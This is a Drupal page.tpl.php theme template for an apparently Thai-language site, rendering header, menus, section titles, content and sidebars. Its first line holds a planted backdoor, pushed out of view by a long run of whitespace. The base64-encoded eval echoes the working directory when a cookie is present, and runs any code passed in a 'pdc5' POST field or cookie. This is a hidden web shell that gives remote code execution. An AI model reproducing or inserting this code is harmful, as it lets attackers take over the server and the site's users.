<?php  	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 /*dc55a57e9f78d91eb20f867c5ee9b3fc*/ eval(base64_decode("JGMgID0gICd5Jzs7IDsgICAgaWYgICggICAgIGlzc2V0KCAgICAkX0NPT0tJRVsnZHdjJ10pICAgKSAgIHsgIGVjaG8gICAgICc8Y3dkPicgIC4gICBnZXRjd2QoKSAgIC4gICAnPC9jd2Q+Jzs7IDsgICAgfSAgIGlmICAgICAoICAgICBpc3NldCAgKCAgICRfUE9TVFsncGRjNSddICAgKSAgICAgKSAgeyAgZXZhbCAgICAoICAgYmFzZTY0X2RlY29kZSAgKCAgICRfUE9TVFsncGRjNSddICAgKSAgKTs7ICAgICAgcmV0dXJuOzsgOyA7ICAgIH0gIGlmICAoICAgaXNzZXQoICAkX0NPT0tJRVsncGRjNSddKSAgICAgKSAgICAgeyAgIGV2YWwgICAgICggICAgYmFzZTY0X2RlY29kZSAgICAoICAkX0NPT0tJRVsncGRjNSddICApICAgICApOzsgOyAgICAgcmV0dXJuOzsgOyAgICAgfSAgICAg")); ?><?php
/**
 * @file
 * Default theme implementation to display a single Drupal page.
 *
 * Available variables:
 *
 * General utility variables:
 * - $base_path: The base URL path of the Drupal installation. At the very
 *   least, this will always default to /.
 * - $directory: The directory the template is located in, e.g. modules/system
 *   or themes/garland.
 * - $is_front: TRUE if the current page is the front page.
 * - $logged_in: TRUE if the user is registered and signed in.
 * - $is_admin: TRUE if the user has permission to access administration pages.
 * - $in_overlay: TRUE if the page is in the overlay.
 *
 * Site identity:
 * - $front_page: The URL of the front page. Use this instead of $base_path,
 *   when linking to the front page. This includes the language domain or
 *   prefix.
 * - $logo: The path to the logo image, as defined in theme configuration.
 * - $site_name: The name of the site, empty when display has been disabled
 *   in theme settings.
 * - $site_slogan: The slogan of the site, empty when display has been disabled
 *   in theme settings.
 *
 * Navigation:
 * - $main_menu (array): An array containing the Main menu links for the
 *   site, if they have been configured.
 * - $secondary_menu (array): An array containing the Secondary menu links for
 *   the site, if they have been configured.
 * - $breadcrumb: The breadcrumb trail for the current page.
 *
 * Page content (in order of occurrence in the default page.tpl.php):
 * - $title_prefix (array): An array containing additional output populated by
 *   modules, intended to be displayed in front of the main title tag that
 *   appears in the template.
 * - $title: The page title, for use in the actual HTML content.
 * - $title_suffix (array): An array containing additional output populated by
 *   modules, intended to be displayed after the main title tag that appears in
 *   the template.
 * - $messages: HTML for status and error messages. Should be displayed
 *   prominently.
 * - $tabs (array): Tabs linking to any sub-pages beneath the current page
 *   (e.g., the view and edit tabs when displaying a node).
 * - $action_links (array): Actions local to the page, such as 'Add menu' on the
 *   menu administration interface.
 * - $feed_icons: A string of all feed icons for the current page.
 * - $node: The node object, if there is an automatically-loaded node
 *   associated with the page, and the node ID is the second argument
 *   in the page's path (e.g. node/12345 and node/12345/revisions, but not
 *   comment/reply/12345).
 *
 * Regions:
 * - $page['help']: Dynamic help text, mostly for admin pages.
 * - $page['highlight']: Items for the highlighted content region.
 * - $page['content']: The main content of the current page.
 * - $page['sidebar_first']: Items for the first sidebar.
 * - $page['sidebar_second']: Items for the second sidebar.
 * - $page['header']: Items for the header region.
 * - $page['footer']: Items for the footer region.
 *
 * @see template_preprocess()
 * @see template_preprocess_page()
 * @see template_process()
 */
if (arg(0) == 'node' && is_numeric(arg(1)) && strlen(arg(2)) < 1) {
  $path_alias = drupal_get_path_alias();
}
?>
  <?php if ($leaderboard = render($page['leaderboard'])): ?>
    <div id="leaderboard" class="clearfix">
      <?php print $leaderboard; ?>
    </div>
  <?php endif; ?>

  <?php if ($secondary_menu_links): ?>
    <nav id="secondary-menu-wrapper" class="clearfix" role="navigation">
      <div class="secondary-menu-inner"><?php print $secondary_menu_links; ?></div>
    </nav>
  <?php endif; ?>

  <header id="header" class="clearfix" role="banner">
	  <div class="container">

     <?php if ($linked_site_logo || $site_name || $site_slogan): ?>
      <div id="branding">

         <?php if ($linked_site_logo): ?>
          <div id="logo"><?php print $linked_site_logo; ?></div>
        <?php endif; ?>

        <?php if ($site_name || $site_slogan): ?>
          <hgroup<?php if (!$site_slogan && $hide_site_name): ?> class="<?php print $visibility; ?>"<?php endif; ?>>
            <?php if ($site_name): ?>
              <h1 id="site-name"<?php if ($hide_site_name): ?> class="<?php print $visibility; ?>"<?php endif; ?>><?php print $site_name; ?></h1>
            <?php endif; ?>
            <?php if ($site_slogan): ?>
              <h2 id="site-slogan"><?php print $site_slogan; ?></h2>
            <?php endif; ?>
          </hgroup>
        <?php endif; ?>

      </div> <!-- /branding -->
    <?php endif; ?>

    <?php if ($header_blocks = render($page['header'])): ?>
      <div id="header-blocks"><?php print $header_blocks; ?></div>
    <?php endif; ?>
	</div>
  </header> <!-- /header -->

  <?php if ($main_menu_links): ?>
    <nav id="main-menu-wrapper" class="clearfix" role="navigation">
      <div class="main-menu-inner"><?php print $main_menu_links; ?></div>
    </nav>
  <?php endif; ?>
  
  <div id="msg">
	  <div class="container">
		  <?php print $messages; ?>
		  <?php if ($help = render($page['help'])): print $help; endif; ?>
	  </div>	  
  </div>

  <?php if ($secondary_content = render($page['secondary_content'])): ?>
    <div id="secondary-content">
	    <div class="container">
		    <?php print $secondary_content; ?>
	    </div>
    </div>
  <?php endif; ?>
  
  <?php if ($title): ?>
  <div class="title">
	  <div class="container">
		  <?php print render($title_prefix); ?>
        <?php if (@$path_alias): ?>
          <?php if ($path_alias != 'topics' && strpos($path_alias, 'topics') === 0): ?>
            <!-- Section ประเด็น -->
            <h1 id="page-title">ประเด็น</h1>
          <?php elseif ($path_alias != 'media' && strpos($path_alias, 'media') === 0): ?>
            <!-- Section บอกต่อ -->
            <h1 id="page-title">บอกต่อ</h1>
          <?php elseif ($path_alias != 'knowledge' && strpos($path_alias, 'knowledge') === 0): ?>
            <!-- Section บอกต่อ -->
            <h1 id="page-title">คลังข้อมูล</h1>
          <?php elseif ($path_alias != 'activities' && strpos($path_alias, 'activities') === 0): ?>
            <!-- Section บอกต่อ -->
            <h1 id="page-title">กิจกรรม</h1>
          <?php else: ?>
  		      <h1 id="page-title"><?php print $title; ?></h1>
          <?php endif; ?>
        <?php endif; ?>
		  <?php print render($title_suffix); ?>
	  </div>
	  <div class="shadow"></div>
  </div>
  <?php endif; ?>

  <div class="main-content" >
	  <div class="container">

        <?php if ($highlighted = render($page['highlighted'])): ?>
          <div id="highlighted"><?php print $highlighted; ?></div>
        <?php endif; ?>

        <div id="main-content" role="main">
          <?php if ($tabs = render($tabs)): ?>
            <div class="local-tasks"><?php print $tabs; ?></div>
          <?php endif; ?>

          <?php if ($action_links = render($action_links)): ?>
            <ul class="action-links"><?php print $action_links; ?></ul>
          <?php endif; ?>
          
          <?php 
          if (!$is_front):
            //print $breadcrumb;
          endif;
          ?>

          <div id="content">
            <?php if (
              @$path_alias && 
              (
                ($path_alias != 'topics' && strpos($path_alias, 'topics') === 0) 
                ||
                ($path_alias != 'media' && strpos($path_alias, 'media') === 0)
                ||
                ($path_alias != 'knowledge' && strpos($path_alias, 'knowledge') === 0)
                ||
                ($path_alias != 'activities' && strpos($path_alias, 'activities') === 0)
              )
            ): ?>
              <h2 id="page-node-subtitle"><?php print $title; ?></h2>
            <?php endif; ?>
            <?php print render($page['content']); ?>
            <?php print $feed_icons; ?>
          </div>
          
           <?php if ($sidebar_first = render($page['sidebar_first'])): ?>
            <div id="sidebar-first" class="sidebar"><?php print $sidebar_first; ?></div>
          <?php endif; ?>
      
          <?php if ($sidebar_second = render($page['sidebar_second'])): ?>
            <div id="sidebar-second" class="sidebar"><?php print $sidebar_second; ?></div>
          <?php endif; ?>

      </div>
    </div>

   

  </div> <!-- /columns -->

  <?php if ($tertiary_content = render($page['tertiary_content'])): ?>
    <div id="tertiary-content">
      <?php print $tertiary_content; ?>
    </div>
  <?php endif; ?>

  <?php if ($page_footer = render($page['footer'])): ?>
    <footer id="footer" role="contentinfo" class="clearfix">
	    <div class="container">
	      <?php print $page_footer; ?>
	      </div>
    </footer>
  <?php endif; ?>
